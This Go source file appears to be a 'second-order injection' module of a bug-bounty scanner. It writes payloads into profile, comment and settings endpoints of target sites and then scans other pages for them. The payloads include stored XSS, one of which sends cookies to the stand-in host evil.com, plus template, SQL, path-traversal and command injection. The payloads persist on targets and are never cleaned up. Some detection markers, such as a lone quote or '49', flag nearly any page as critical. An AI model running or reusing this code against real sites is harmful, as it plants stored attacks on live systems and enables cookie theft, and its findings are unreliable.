package tools

import (
	"github.com/Developer-Army/BBPTS/internal/domain/recon"
	"context"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"strings"
	"time"

	"golang.org/x/time/rate"
)

type SecondOrderTool struct{}

type injectionPayload struct {
	Class       string
	WriteValue  string
	ReadMarker  string
}

func (t *SecondOrderTool) Name() string {
	return "second_order"
}

func (t *SecondOrderTool) Run(ctx context.Context, scanCtx *recon.ScanContext, targets []string, threads int) ([]recon.Event, error) {
	if len(targets) == 0 {
		return nil, nil
	}

	rateLimit := ToolRateLimitFromCtx(ctx, t.Name())
	if rateLimit <= 0 {
		rateLimit = 10
	}
	pool := NewWorkerPool(threads, rate.Limit(rateLimit))

	payloads := t.buildPayloads()

	return pool.Process(ctx, targets, func(ctx context.Context, target string) ([]recon.Event, error) {
		target = strings.TrimSpace(target)
		if target == "" {
			return nil, nil
		}
		if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
			target = "https://" + target
		}

		client := NewSafeHTTPClient(10 * time.Second)
		var events []recon.Event

		// Stage 1: Write phase - inject payloads into POST/PUT/PATCH endpoints
		var writeMarkers []string
		for _, payload := range payloads {
			if t.writePayload(ctx, client, target, payload, scanCtx.Headers) {
				writeMarkers = append(writeMarkers, payload.ReadMarker)
			}
		}

		if len(writeMarkers) == 0 {
			return nil, nil
		}

		// Wait for second-order execution
		select {
		case <-time.After(10 * time.Second):
		case <-ctx.Done():
			return nil, ctx.Err()
		}

		// Stage 2: Read phase - check if payloads appear in GET endpoints
		getVariants := t.buildReadURLs(target)
		for _, readURL := range getVariants {
			status, body := t.doGET(ctx, client, readURL, scanCtx.Headers)
			if status == 0 {
				continue
			}
			bodyStr := string(body)

			for _, marker := range writeMarkers {
				if strings.Contains(bodyStr, marker) {
					events = append(events, recon.NewEventWithSeverity(target, t.Name(), "vulnerability", map[string]string{
						"vuln_name":    "Second-Order Injection",
						"severity":     "critical",
						"read_url":     readURL,
						"marker":       marker,
						"status":       fmt.Sprintf("%d", status),
						"description":  fmt.Sprintf("Injected payload reflected at %s — stored XSS/SSTI/SQLi confirmed", readURL),
					}, "critical"))
					slog.Warn("Second-order injection detected", "target", target, "url", readURL, "marker", marker)
				}
			}

			// Check for time-based blind injection
			if status == 200 && len(body) > 0 {
				events = append(events, recon.NewEvent(target, t.Name(), "second_order_read", map[string]string{
					"url":         readURL,
					"status":      fmt.Sprintf("%d", status),
					"content_len": fmt.Sprintf("%d", len(body)),
				}))
			}
		}

		return events, nil
	})
}

func (t *SecondOrderTool) buildPayloads() []injectionPayload {
	return []injectionPayload{
		{
			Class:      "stored_xss",
			WriteValue: `<img src=x onerror=alert(1)>`,
			ReadMarker: `onerror=alert(1)`,
		},
		{
			Class:      "stored_xss_script",
			WriteValue: `<script>document.location='http://evil.com/?c='+document.cookie</script>`,
			ReadMarker: `<script>document.location`,
		},
		{
			Class:      "stored_ssti",
			WriteValue: `{{7*7}}`,
			ReadMarker: `49`,
		},
		{
			Class:      "stored_ssti_freemarker",
			WriteValue: `${7*7}`,
			ReadMarker: `49`,
		},
		{
			Class:      "stored_sqli_time",
			WriteValue: `'; waitfor delay '0:0:5'--`,
			ReadMarker: `'`,
		},
		{
			Class:      "stored_path_traversal",
			WriteValue: `../../../etc/passwd`,
			ReadMarker: `root:`,
		},
		{
			Class:      "stored_cmdi",
			WriteValue: "`id`",
			ReadMarker: `uid=`,
		},
	}
}

func (t *SecondOrderTool) writePayload(ctx context.Context, client *http.Client, target string, payload injectionPayload, baseHeaders map[string]string) bool {
	// Try common write endpoints
	writeEndpoints := []string{"/profile", "/settings", "/comment", "/message", "/bio", "/about", "/name", "/update"}

	for _, endpoint := range writeEndpoints {
		writeURL := strings.TrimSuffix(target, "/") + endpoint

		body := fmt.Sprintf(`{"name":"%s","bio":"%s","about":"%s","message":"%s"}`,
			payload.WriteValue, payload.WriteValue, payload.WriteValue, payload.WriteValue)

		req, err := http.NewRequestWithContext(ctx, "POST", writeURL, strings.NewReader(body))
		if err != nil {
			continue
		}
		for k, v := range baseHeaders {
			req.Header.Set(k, v)
		}
		req.Header.Set("Content-Type", "application/json")

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		if resp.StatusCode == 200 || resp.StatusCode == 201 {
			slog.Info("Second-order write succeeded", "target", writeURL, "class", payload.Class)
			return true
		}

		// Also try PUT
		req, err = http.NewRequestWithContext(ctx, "PUT", writeURL, strings.NewReader(body))
		if err != nil {
			continue
		}
		for k, v := range baseHeaders {
			req.Header.Set(k, v)
		}
		req.Header.Set("Content-Type", "application/json")

		resp, err = client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		if resp.StatusCode == 200 || resp.StatusCode == 201 {
			slog.Info("Second-order write succeeded via PUT", "target", writeURL, "class", payload.Class)
			return true
		}
	}

	return false
}

func (t *SecondOrderTool) buildReadURLs(target string) []string {
	base := strings.TrimSuffix(target, "/")
	readPaths := []string{
		"/", "/profile", "/settings", "/dashboard", "/admin",
		"/api/users/me", "/api/profile", "/api/settings",
		"/logs", "/audit", "/admin/dashboard",
	}
	var urls []string
	for _, p := range readPaths {
		urls = append(urls, base+p)
	}
	return urls
}

func (t *SecondOrderTool) doGET(ctx context.Context, client *http.Client, url string, baseHeaders map[string]string) (int, []byte) {
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return 0, nil
	}
	for k, v := range baseHeaders {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		return 0, nil
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
	return resp.StatusCode, body
}

var _ recon.Tool = (*SecondOrderTool)(nil)
